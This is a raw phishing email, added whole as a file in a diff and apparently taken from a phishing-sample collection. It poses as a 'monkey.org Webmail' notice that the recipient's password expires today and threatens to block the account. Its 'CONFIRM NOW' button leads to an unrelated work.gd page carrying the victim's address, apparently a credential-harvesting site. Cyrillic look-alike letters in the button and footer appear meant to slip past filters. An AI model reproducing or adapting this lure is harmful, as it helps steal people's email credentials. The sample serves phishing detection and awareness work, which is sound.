@@ -1,0 +1,115 @@
+From jose@monkey.org Tue Aug 15 16:18:24 2023 +0000
+Return-Path: shore@thestartupschool.pk
+Delivered-To: jose@monkey.org
+X-FDA: 81126846528.14.E64FD28
+Received: from 6071310.pakistanshowbiz.online (unknown [162.240.66.173])
+	by imf14.b.hostedemail.com (Postfix) with ESMTP id 2E37A60009
+	for <jose@monkey.org>; Tue, 15 Aug 2023 16:18:22 +0000 (UTC)
+Authentication-Results: imf14.b.hostedemail.com;
+	dkim=pass header.d=thestartupschool.pk header.s=default header.b=sXxqXHqJ;
+	dmarc=none;
+	spf=pass (imf14.b.hostedemail.com: domain of shore@thestartupschool.pk designates 162.240.66.173 as permitted sender) smtp.mailfrom=shore@thestartupschool.pk
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1692116302;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=J28SuFLsRjrqGOJs5UeBBgZBYb7skQMzxzWDj4Y1qFw=;
+	b=XrV/IRbjCgeWaMDpVFlnCcBnvaI5MPryDxQTfCD4zUdfoZFfOksxHZIZOjMyzqgmq8vBYR
+	xosCHweCIa3Nhcy6voiTMkCmrK0MfulEhkAH11Fxox7yAwU4p1f535EyJEYRlWxcMo2mSY
+	PUA1kfVfUfCn+Yu0aQLMI//+RViIJSc=
+ARC-Authentication-Results: i=1;
+	imf14.b.hostedemail.com;
+	dkim=pass header.d=thestartupschool.pk header.s=default header.b=sXxqXHqJ;
+	dmarc=none;
+	spf=pass (imf14.b.hostedemail.com: domain of shore@thestartupschool.pk designates 162.240.66.173 as permitted sender) smtp.mailfrom=shore@thestartupschool.pk
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1692116302; a=rsa-sha256;
+	cv=none;
+	b=t11QXPEL5r7oDrRHqADzN5q681beSjtpJGFuS7Eq+JsQxFuwsUUMqyky0r/F+SkOcmxOUl
+	r+b+4LwEsqkOGMM4nVIMQIVeZdrn0kSEZsyHYzNp8tQSDxOeJh5RweROJAjtH8jVvaiqbu
+	BwBnprq1gd1kBfFwoKeUCZe31eP+Rbc=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=thestartupschool.pk; s=default; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=J28SuFLsRjrqGOJs5UeBBgZBYb7skQMzxzWDj4Y1qFw=; b=sXxqXHqJMq7TuUqoFosO9ceOV2
+	UVqtnaZb1Kv5TJJ5QE2byUY1cOpXQnHRzvMySEmJhf1249yYiuT6z71Zu9R/UwL/hxpQwOYX4ZI6a
+	u0bTAXGCMwWSp/vfc6ANDZgi8KzPgZjkgCx+Fg/yxI7xK7Wu+b+U+aWbRWfhBDfihSTzNbjh1xQ1d
+	dinhgSBaE9jhnnpZDTBjens/7OWQt6dMp5ok4RKT2O468vFEe7w+XHiyVzCFNIjwx7QGWYLzkYelN
+	2MT2Xcg/K/KTgUeJEgAoZlkYBngM1mgHn1PTiCdOUJnZ4hEqQmfPNYwNhezuHy1ioCCyhzf1KI3eU
+	nO5RyGFw==;
+Received: from [191.101.90.2] (port=41185 helo=thestartupschool.pk)
+	by 6071310.pakistanshowbiz.online with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.96)
+	(envelope-from <shore@thestartupschool.pk>)
+	id 1qNu8R-0008Eo-3D
+	for jose@monkey.org;
+	Mon, 24 Jul 2023 06:53:56 -0500
+From: monkey.org Webmail <shore@thestartupschool.pk>
+To: jose@monkey.org
+Subject: Renew Your E-mail Password jose@monkey.org
+Date: 24 Jul 2023 13:54:36 +0200
+Message-ID: <20230724135436.1919BA42CC209907@thestartupschool.pk>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - 6071310.pakistanshowbiz.online
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - thestartupschool.pk
+X-Get-Message-Sender-Via: 6071310.pakistanshowbiz.online: authenticated_id: shore@thestartupschool.pk
+X-Authenticated-Sender: 6071310.pakistanshowbiz.online: shore@thestartupschool.pk
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Queue-Id: 2E37A60009
+X-Stat-Signature: qbuexy6dbkpt6a1x9gnjr341k195adrh
+X-Rspam-User: 
+X-Spam-Status: No, score=8.30
+X-Rspamd-Server: rspam07
+X-HE-Tag: 1692116302-248902
+X-HE-Meta: U2FsdGVkX19z+TCYC5EoaTMCNDqelNnb1YwFQhYpLXLAb2AP0s8Qz2k8eP3Eh7OSydUmCnJMLaDzfcIZXHSsqcf5rt+hy2cZUwFbhxxGxZs7yqTM1vMksMlBhKIudZEUz1mvUahgkXoIEqMGc9HAkjXqSUTfLuE8PJjDjmTl9LQ7ac/3CBalX3D0OY4Y8rW+/p0hBD6yQQqryQZcaTg9tMMGxzDo92HX8u+zkGfwf5AVEATSAwMapNikkcb2/yinpYI1v2k1bbj5ufZi/xd90ZmyGbjfeRpOj9l4/0k/PwSzStpdokYYK18gtuq1z5cO3gU7kJNvqGHmSFRnf96FaSCuVn+larVw4vSz8Q8aJOQ2TIoBGHafIyAkqPjIwj1nT8Mq3VCQEfE8rJQsfFHmVvEj3wdFge6A5U2Lz+L+j9CGeuryZwZ08koWKfyGgntmcgmrGeKx7pDbE+uBObqbzSxoUD+qCvILH9/GEP596D0AfTYirDEysvBz1QksVKNUA4+e0+e22xn8PwNTCLTYdF0fl8SGpKfz9699QpqpeT4=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 245
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19003"></HEAD>
+<body>
+<DIV style=3D"BORDER-TOP: #efe9e9 1px solid; BORDER-RIGHT: #efe9e9 1px soli=
+d; WIDTH: 650px; BORDER-BOTTOM: #efe9e9 1px solid; PADDING-BOTTOM: 2px; TEX=
+T-ALIGN: left; PADDING-TOP: 2px; PADDING-LEFT: 2px; BORDER-LEFT: #efe9e9 1p=
+x solid; PADDING-RIGHT: 2px">Dear jose,<BR><BR>Your jose@monkey.org account=
+ password is set to expire today<BR>Click below to continue with the same p=
+assword<BR>&nbsp;=20
+<table style=3D"FONT-FAMILY: 'Times New Roman'; WORD-SPACING: 0px; TEXT-TRA=
+NSFORM: none; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0=
+px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-de=
+coration-color: initial" width=3D"209">
+<TBODY>
+<TR>
+<td style=3D"FONT-SIZE: 14px; BORDER-TOP: rgb(0,120,215) 1px solid; HEIGHT:=
+ 30px; FONT-FAMILY: 'Segoe UI Semibold', 'Segoe WP Semibold', 'Segoe UI', '=
+Segoe WP', Segoe, Tahoma, 'Microsoft Sans Serif', Verdana, sans-serif; BORD=
+ER-RIGHT: rgb(0,120,215) 1px solid; WIDTH: 163px; VERTICAL-ALIGN: middle; W=
+HITE-SPACE: nowrap; BORDER-BOTTOM: rgb(0,120,215) 1px solid; COLOR: rgb(255=
+,255,255); TEXT-ALIGN: center; PADDING-LEFT: 20px; MARGIN: 0px; BORDER-LEFT=
+: rgb(0,120,215) 1px solid; LINE-HEIGHT: 20px;=20
+PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(0,120,215)"><A style=3D"TEXT-DEC=
+ORATION: none; COLOR: rgb(255,255,255)" href=3D"https://ikjhherefsgsgdii.wo=
+rk.gd/index.html#jose@monkey.org">&#1057;&#1054;NFIRM N&#1054;W</A></TD></T=
+R></TBODY></TABLE>
+<P>Your account will be blocked on failure to carry out this above activity=
+</P>
+<P>Email Service<BR>
+<HR>
+</P>
+<P><SPAN style=3D"TEXT-DECORATION: none; COLOR: #6e788b">Th&#1110;s &#1077;=
+m&#1072;&#1110;l w&#1072;s s&#1077;nt t&#1086; jose@monkey.org<EMAILCENSORE=
+D></EMAIL></SPAN><BR></P></DIV></BODY></HTML>
